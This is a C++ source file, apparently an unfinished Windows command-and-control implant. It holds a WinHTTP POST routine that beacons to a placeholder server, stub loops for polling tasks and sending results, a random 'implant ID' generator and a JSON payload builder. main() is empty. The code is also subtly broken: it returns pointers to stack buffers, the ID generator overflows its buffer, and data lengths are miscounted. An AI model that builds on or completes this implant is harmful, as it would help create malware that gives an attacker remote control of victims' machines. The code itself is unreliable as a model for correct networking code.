/**post request, try initial communcation with c2, when working->
every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->post to payload**/
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <iostream>
#include <Windows.h>
#include <winhttp.h>
#define SERVERNAME "placeholder"
#define SLEEP 10

size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
{
    data->append((char *)ptr, size * nmemb);
    return size * nmemb;
}

void tasks()
{
    while (1)
    {
        Sleep(SLEEP);
    }
}

int makePostRequest(LPCWSTR servername, LPCWSTR postdata){
    DWORD datalen=wcslen(postdata);
    HINTERNET httpsession = WinHttpOpen(
        L"GenericAPICaller",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if(httpsession!=NULL){
        //std::cout<<"Session Started\n";
        HINTERNET connectsesh = WinHttpConnect(
            httpsession,
            servername,
            INTERNET_DEFAULT_HTTPS_PORT,
            0);
        if (connectsesh != NULL)
        {
            //std::cout<<"connect \n";
            HINTERNET request = WinHttpOpenRequest(
                connectsesh,
                L"POST",
                L"/post",
                NULL,
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (request != NULL)
            {
                //std::cout<<"request \n";
                BOOL idrequest = WinHttpSendRequest(
                    request,
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    0,
                    (LPVOID)postdata,
                    datalen,
                    datalen,
                    0);
                if (idrequest == TRUE)
                {
                    //std::cout<<"sendrequest \n";
                    BOOL response = WinHttpReceiveResponse(
                        request,
                        NULL);
                    if(response==true)
                    {
                        //std::cout<<"receiveresponse \n";
                        DWORD bytesneeded;
                        BOOL query= WinHttpQueryDataAvailable(
                        request,
                        &bytesneeded);
                        //char *returnbuffer = (char *)malloc((size_t)bytesneeded);
                        LPSTR returnbuffer=new char[(bytesneeded+1)];
                        if(query==TRUE){
                            if(returnbuffer){
                                ZeroMemory(returnbuffer, bytesneeded+1);
                                std::cout<<"Returnbuffer created.";
                                std::cout<<"queryavailable \n";
                                BOOL dataread=WinHttpReadData(
                                request,
                                returnbuffer,
                                16,
                                NULL);
                                if(dataread==TRUE){
                                    //std::cout<<"dataread \n";
                                    std::cout << returnbuffer;
                                    return 0;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
return -1;
}


int sendresults()
{
    while (1)
    {
        Sleep(SLEEP);
        // Send results, check response
        // If good response break
    }
}

// Random Implant ID in hex using rand()
// https://stackoverflow.com/questions/33325814/how-to-loop-generate-random-256bit-hex-in-c-or-c
char *random_id()
{
    char random_hex[32 + 1];
    char *random_hexptr = random_hex;

    srand(time(0));
    for (int i = 0; i < 32; i++)
    {
        sprintf(random_hex + i, "%x", rand() % 32);
    }

    return random_hexptr;
}

char *make_base_payload(char *implant_id)
{

    char payload[51] = "{\"implant_id\": }";
    char *payloadptr = payload;
    strcat(payload, implant_id);
    return payloadptr;
}

int main(int argc, char *argv[])
{



return 0;
}
